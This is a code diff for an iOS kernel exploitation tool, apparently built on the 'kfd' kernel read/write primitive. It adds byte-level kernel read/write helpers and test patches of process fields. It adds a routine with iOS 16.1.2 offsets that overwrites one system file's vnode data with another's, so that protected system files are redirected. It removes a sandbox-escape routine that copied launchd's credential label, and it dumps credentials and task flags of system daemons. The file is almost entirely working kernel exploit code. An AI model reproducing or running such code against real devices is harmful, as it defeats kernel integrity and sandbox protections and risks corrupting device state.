@@ -178,6 +178,11 @@ void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
     krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
 }
 
+uint8_t kread8(u64 kfd, uint64_t where) {
+    uint8_t out;
+    kread(kfd, where, &out, sizeof(uint8_t));
+    return out;
+}
 uint32_t kread32(u64 kfd, uint64_t where) {
     uint32_t out;
     kread(kfd, where, &out, sizeof(uint32_t));
@@ -189,6 +194,18 @@ uint64_t kread64(u64 kfd, uint64_t where) {
     return out;
 }
 
+void kwrite8(u64 kfd, uint64_t where, uint8_t what) {
+    uint8_t _buf[8] = {};
+    _buf[0] = what;
+    _buf[1] = kread8(kfd, where+1);
+    _buf[2] = kread8(kfd, where+2);
+    _buf[3] = kread8(kfd, where+3);
+    _buf[4] = kread8(kfd, where+4);
+    _buf[5] = kread8(kfd, where+5);
+    _buf[6] = kread8(kfd, where+6);
+    _buf[7] = kread8(kfd, where+7);
+    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
+}
 void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
     u32 _buf[2] = {};
     _buf[0] = what;
@@ -235,53 +252,14 @@ int getPidByName(u64 kfd, char* nm) {
     return kread32(kfd, getProcByName(kfd, nm) + 0x60);//PROC_P_PID_OFF);
 }
 
-bool escapeSandboxForProcess(u64 kfd, uint64_t proc){
-    uint64_t proc_ro = kread64(kfd, proc + 0x18);
-    uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
-    uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
-    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
-    printf("[i] cr_label: 0x%llx\n", cr_label);
-    uint64_t sandbox_slot = kread64(kfd, cr_label + 0x8);
-    printf("[i] sandbox_slot: 0x%llx\n", sandbox_slot);
-    sleep(3);
-    
-    uint64_t _pid = getPidByName(kfd, "launchd");
-    uint64_t _proc = getProc(kfd, _pid);
-    uint64_t _proc_ro = kread64(kfd, _proc + 0x18);
-    uint64_t _ucreds = kread64(kfd, _proc_ro + 0x20);
-    uint64_t _cr_label_pac = kread64(kfd, _ucreds + 0x78);
-    uint64_t _cr_label = _cr_label_pac | 0xffffff8000000000;
-    printf("[i] _cr_label: 0x%llx\n", _cr_label);
-    uint64_t _sandbox_slot = kread64(kfd, _cr_label + 0x8);
-    printf("[i] _sandbox_slot: 0x%llx\n", _sandbox_slot);
-    sleep(3);
-    
-//    sleep(3);
-//    kwrite((u64)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(u64));
-    
-//    uint64_t test = (uint64_t)malloc(8); // let's pretend this is a kernel address
-//    uint64_t value_to_copy = 0x4142434445464748; // Sample 64-bit value
-//        memcpy(test, &value_to_copy, sizeof(uint64_t));
-//    *test = (uint64_t)0x4142434445464748;
-//    void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
-//    kwrite_dup_kwrite_u64((u64)(kfd), 0x4142434445464748, test);
-//    kwrite64(kfd, test, 0x4142434445464748);
-//    printf("[i] Wrote: 0x%lx\n", 0x4142434445464748);
-//    printf("[i] Read back: 0x%llx\n", kread64(kfd, test));
-//    sleep(3);
-    
-    kwrite64(kfd, cr_label + 0x8/*SANDBOX_SLOT_OFF*/, sandbox_slot);
-    return false;
-}
-
 int funProc(u64 kfd, uint64_t proc) {
     int p_ppid = kread32(kfd, proc + 0x20);
     printf("[i] self proc->p_ppid: %d\n", p_ppid);
-//    printf("[i] Patching proc->p_ppid to 1: %d\n", p_ppid);
-//    kwrite32(kfd, proc + 0x20, 0x1);
-//
-//    printf("getppid(): %u\n", getppid());
-//
+    printf("[i] Patching proc->p_ppid %d -> 1 (for testing kwrite32)\n", p_ppid);
+    kwrite32(kfd, proc + 0x20, 0x1);
+    printf("getppid(): %u\n", getppid());
+    kwrite32(kfd, proc + 0x20, p_ppid);
+
     int p_original_ppid = kread32(kfd, proc + 0x24);
     printf("[i] self proc->p_original_ppid: %d\n", p_original_ppid);
     
@@ -312,22 +290,32 @@ int funProc(u64 kfd, uint64_t proc) {
     uint64_t p_puniqueid = kread64(kfd, proc + 0x48);
     printf("[i] self proc->p_puniqueid: 0x%llx\n", p_puniqueid);
     
-//    kwrite64(kfd, proc+0x48, 0x4142434445464748);
-//
-//    p_puniqueid = kread64(kfd, proc + 0x48);
-//    printf("[i] self proc->p_puniqueid: 0x%llx\n", p_puniqueid);
+    printf("[i] Patching proc->p_puniqueid 0x%llx -> 0x4142434445464748 (for testing kwrite64)\n", p_puniqueid);
+    kwrite64(kfd, proc+0x48, 0x4142434445464748);
+    printf("[i] self proc->p_puniqueid: 0x%llx\n", kread64(kfd, proc + 0x48));
+    kwrite64(kfd, proc+0x48, p_puniqueid);
     
     return 0;
 }
 
-int funRoot(u64 kfd, uint64_t proc) {
+int funUcred(u64 kfd, uint64_t proc) {
     uint64_t proc_ro = kread64(kfd, proc + 0x18);
     uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
-    uint64_t cr_posix_p = ucreds + 0x18;
     
+    uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
+    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
+    printf("[i] self ucred->cr_label: 0x%llx\n", cr_label);
+    
+    uint64_t cr_posix_p = ucreds + 0x18;
     printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
     printf("[i] self ucred->posix_cred->cr_ruid: %u\n", kread32(kfd, cr_posix_p + 4));
     printf("[i] self ucred->posix_cred->cr_svuid: %u\n", kread32(kfd, cr_posix_p + 8));
+    printf("[i] self ucred->posix_cred->cr_ngroups: %u\n", kread32(kfd, cr_posix_p + 0xc));
+    printf("[i] self ucred->posix_cred->cr_groups: %u\n", kread32(kfd, cr_posix_p + 0x10));
+    printf("[i] self ucred->posix_cred->cr_rgid: %u\n", kread32(kfd, cr_posix_p + 0x50));
+    printf("[i] self ucred->posix_cred->cr_svgid: %u\n", kread32(kfd, cr_posix_p + 0x54));
+    printf("[i] self ucred->posix_cred->cr_gmuid: %u\n", kread32(kfd, cr_posix_p + 0x58));
+    printf("[i] self ucred->posix_cred->cr_flags: %u\n", kread32(kfd, cr_posix_p + 0x5c));
     
 //    sleep(3);
 //    kwrite32(kfd, cr_posix_p+0, 501);
@@ -347,6 +335,7 @@ int funRoot(u64 kfd, uint64_t proc) {
 //    kwrite64(kfd, cr_posix_p+88, 0);
     
 //    setgroups(0, 0);
+    return 0;
 }
 
 uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
@@ -407,6 +396,141 @@ uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
     return 0;
 }
 
+uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
+    //16.1.2 offsets
+    uint32_t off_p_pfd = 0xf8;
+    uint32_t off_fd_ofiles = 0;
+    uint32_t off_fp_fglob = 0x10;
+    uint32_t off_fg_data = 0x38;
+    uint32_t off_vnode_iocount = 0x64;
+    uint32_t off_vnode_usecount = 0x60;
+    uint32_t off_vnode_vflags = 0x54;
+    uint32_t off_vnode_v_mount = 0xd8;
+    uint32_t off_vnode_v_data = 0xe0;
+    uint32_t off_vnode_v_kusecount = 0x5c;
+    uint32_t off_vnode_v_references = 0x5b;
+    uint32_t off_vnode_v_parent = 0xc0;
+    
+    int file_index = open(to, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    //get vnode
+    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
+    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
+    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
+    
+    uint64_t to_v_mount_pac = kread64(kfd, to_vnode + off_vnode_v_mount);
+    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
+    printf("[i] %s to_vnode->v_mount: 0x%llx\n", to, to_v_mount);
+    uint64_t to_v_data = kread64(kfd, to_vnode + off_vnode_v_data);
+    printf("[i] %s to_vnode->v_data: 0x%llx\n", from, to_v_data);
+    
+    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
+    printf("[i] %s to_vnode->v_references: %d\n", to, to_v_references);
+    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
+    printf("[i] %s to_vnode->usecount: %d\n", to, to_usecount);
+    uint32_t to_iocount = kread32(kfd, to_vnode + off_vnode_iocount);
+    printf("[i] %s to_vnode->iocount: %d\n", to, to_iocount);
+    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
+    printf("[i] %s to_vnode->kusecount: %d\n", to, to_v_kusecount);
+    uint64_t to_v_parent_pac = kread64(kfd, to_vnode + off_vnode_v_parent);
+    uint64_t to_v_parent = to_v_parent_pac | 0xffffff8000000000;
+    printf("[i] %s to_vnode->v_parent: 0x%llx\n", to, to_v_parent);
+    uint64_t to_v_freelist_tqe_next = kread64(kfd, to_vnode + 0x10); //v_freelist.tqe_next
+    printf("[i] %s to_vnode->v_freelist.tqe_next: 0x%llx\n", to, to_v_freelist_tqe_next);
+    uint64_t to_v_freelist_tqe_prev = kread64(kfd, to_vnode + 0x18); //v_freelist.tqe_prev
+    printf("[i] %s to_vnode->v_freelist.tqe_prev: 0x%llx\n", to, to_v_freelist_tqe_prev);
+    uint64_t to_v_mntvnodes_tqe_next = kread64(kfd, to_vnode + 0x20);   //v_mntvnodes.tqe_next
+    printf("[i] %s to_vnode->v_mntvnodes.tqe_next: 0x%llx\n", to, to_v_mntvnodes_tqe_next);
+    uint64_t to_v_mntvnodes_tqe_prev = kread64(kfd, to_vnode + 0x28);  //v_mntvnodes.tqe_prev
+    printf("[i] %s to_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", to, to_v_mntvnodes_tqe_prev);
+    uint64_t to_v_ncchildren_tqh_first = kread64(kfd, to_vnode + 0x30);
+    printf("[i] %s to_vnode->v_ncchildren.tqh_first: 0x%llx\n", to, to_v_ncchildren_tqh_first);
+    uint64_t to_v_ncchildren_tqh_last = kread64(kfd, to_vnode + 0x38);
+    printf("[i] %s to_vnode->v_ncchildren.tqh_last: 0x%llx\n", to, to_v_ncchildren_tqh_last);
+    uint64_t to_v_nclinks_lh_first = kread64(kfd, to_vnode + 0x40);
+    printf("[i] %s to_vnode->v_nclinks.lh_first: 0x%llx\n", to, to_v_nclinks_lh_first);
+    uint64_t to_v_defer_reclaimlist = kread64(kfd, to_vnode + 0x48);    //v_defer_reclaimlist
+    printf("[i] %s to_vnode->v_defer_reclaimlist: 0x%llx\n", to, to_v_defer_reclaimlist);
+    uint32_t to_v_listflag = kread32(kfd, to_vnode + 0x50);    //v_listflag
+    printf("[i] %s to_vnode->v_listflag: 0x%x\n", to, to_v_listflag);
+    
+    close(file_index);
+    
+    file_index = open(from, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    //get vnode
+    filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    filedesc = filedesc_pac | 0xffffff8000000000;
+    openedfile = kread64(kfd, filedesc + (8 * file_index));
+    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    fileglob = fileglob_pac | 0xffffff8000000000;
+    vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
+    printf("[i] %s from_vnode: 0x%llx\n", from, from_vnode);
+    
+    uint64_t from_v_mount_pac = kread64(kfd, from_vnode + off_vnode_v_mount);
+    uint64_t from_v_mount = from_v_mount_pac | 0xffffff8000000000;
+    printf("[i] %s from_vnode->v_mount: 0x%llx\n", from, from_v_mount);
+    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
+    printf("[i] %s from_vnode->v_data: 0x%llx\n", from, from_v_data);
+    uint8_t from_v_references = kread8(kfd, from_vnode + off_vnode_v_references);
+    printf("[i] %s from_vnode->v_references: %d\n", from, from_v_references);
+    uint32_t from_usecount = kread32(kfd, from_vnode + off_vnode_usecount);
+    printf("[i] %s from_vnode->usecount: %d\n", from, from_usecount);
+    uint32_t from_iocount = kread32(kfd, from_vnode + off_vnode_iocount);
+    printf("[i] %s from_vnode->iocount: %d\n", from, from_iocount);
+    uint32_t from_v_kusecount = kread32(kfd, from_vnode + off_vnode_v_kusecount);
+    printf("[i] %s from_vnode->kusecount: %d\n", from, from_v_kusecount);
+    uint64_t from_v_parent_pac = kread64(kfd, from_vnode + off_vnode_v_parent);
+    uint64_t from_v_parent = from_v_parent_pac | 0xffffff8000000000;
+    printf("[i] %s from_vnode->v_parent: 0x%llx\n", from, from_v_parent);
+    uint64_t from_v_freelist_tqe_next = kread64(kfd, from_vnode + 0x10); //v_freelist.tqe_next
+    printf("[i] %s from_vnode->v_freelist.tqe_next: 0x%llx\n", from, from_v_freelist_tqe_next);
+    uint64_t from_v_freelist_tqe_prev = kread64(kfd, from_vnode + 0x18); //v_freelist.tqe_prev
+    printf("[i] %s from_vnode->v_freelist.tqe_prev: 0x%llx\n", from, from_v_freelist_tqe_prev);
+    uint64_t from_v_mntvnodes_tqe_next = kread64(kfd, from_vnode + 0x20);   //v_mntvnodes.tqe_next
+    printf("[i] %s from_vnode->v_mntvnodes.tqe_next: 0x%llx\n", from, from_v_mntvnodes_tqe_next);
+    uint64_t from_v_mntvnodes_tqe_prev = kread64(kfd, from_vnode + 0x28);  //v_mntvnodes.tqe_prev
+    printf("[i] %s from_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", from, from_v_mntvnodes_tqe_prev);
+    uint64_t from_v_ncchildren_tqh_first = kread64(kfd, from_vnode + 0x30);
+    printf("[i] %s from_vnode->v_ncchildren.tqh_first: 0x%llx\n", from, from_v_ncchildren_tqh_first);
+    uint64_t from_v_ncchildren_tqh_last = kread64(kfd, from_vnode + 0x38);
+    printf("[i] %s from_vnode->v_ncchildren.tqh_last: 0x%llx\n", from, from_v_ncchildren_tqh_last);
+    uint64_t from_v_nclinks_lh_first = kread64(kfd, from_vnode + 0x40);
+    printf("[i] %s from_vnode->v_nclinks.lh_first: 0x%llx\n", from, from_v_nclinks_lh_first);
+    uint64_t from_v_defer_reclaimlist = kread64(kfd, from_vnode + 0x48);    //v_defer_reclaimlist
+    printf("[i] %s from_vnode->v_defer_reclaimlist: 0x%llx\n", from, from_v_defer_reclaimlist);
+    uint32_t from_v_listflag = kread32(kfd, from_vnode + 0x50);    //v_listflag
+    printf("[i] %s from_vnode->v_listflag: 0x%x\n", from, from_v_listflag);
+    
+    
+    
+//    sleep(2);
+    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
+//    kwrite32(kfd, to_vnode + off_vnode_iocount, to_iocount + 1);
+    
+    kwrite32(kfd, to_vnode + off_vnode_usecount, from_usecount + 1);
+    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, from_v_kusecount + 1);
+    kwrite8(kfd, to_vnode + off_vnode_v_references, from_v_references + 1);
+    
+//    kwrite64(kfd, to_vnode + 0x10, from_v_freelist_tqe_next);
+//    kwrite64(kfd, to_vnode + 0x18, from_v_freelist_tqe_prev);
+//    kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
+//    kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
+//    kwrite64(kfd, to_vnode + 0x30, from_v_ncchildren_tqh_first);
+//    kwrite64(kfd, to_vnode + 0x38, from_v_ncchildren_tqh_last);
+//    kwrite64(kfd, to_vnode + 0x40, from_v_nclinks_lh_first);
+
+    return 0;
+}
+
 int funCSFlags(u64 kfd, char* process) {
     uint64_t pid = getPidByName(kfd, process);
     uint64_t proc = getProc(kfd, pid);
@@ -451,6 +575,14 @@ int funTask(u64 kfd, char* process) {
     uint32_t t_flags = kread32(kfd, pr_task + 0x3D0);
     printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);
     
+    
+    /*
+     * RO-protected flags:
+     */
+    #define TFRO_PLATFORM                   0x00000400                      /* task is a platform binary */
+    #define TFRO_FILTER_MSG                 0x00004000                      /* task calls into message filter callback before sending a message */
+    #define TFRO_PAC_EXC_FATAL              0x00010000                      /* task is marked a corpse if a PAC exception occurs */
+    #define TFRO_PAC_ENFORCE_USER_STATE     0x01000000                      /* Enforce user and kernel signed thread state */
     uint32_t t_flags_ro = kread64(kfd, proc_ro + 0x78);
     printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);
     
@@ -487,16 +619,17 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     uint64_t selfProc = getProc(kfd, myPid);
     printf("[i] self proc: 0x%llx\n", selfProc);
     
-    funRoot(kfd, selfProc);
+    funUcred(kfd, selfProc);
     funProc(kfd, selfProc);
     funVnode(kfd, selfProc, "/System/Library/Audio/UISounds/photoShutter.caf");
     funCSFlags(kfd, "launchd");
-    
+
     funTask(kfd, "launchd");
     funTask(kfd, "kfd");
     funTask(kfd, "SpringBoard");
     funTask(kfd, "amfid");
-    
+    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");
+
 //    printf("UID: %d\n", getuid());
     
 //    escapeSandboxForProcess(kfd, selfProc);
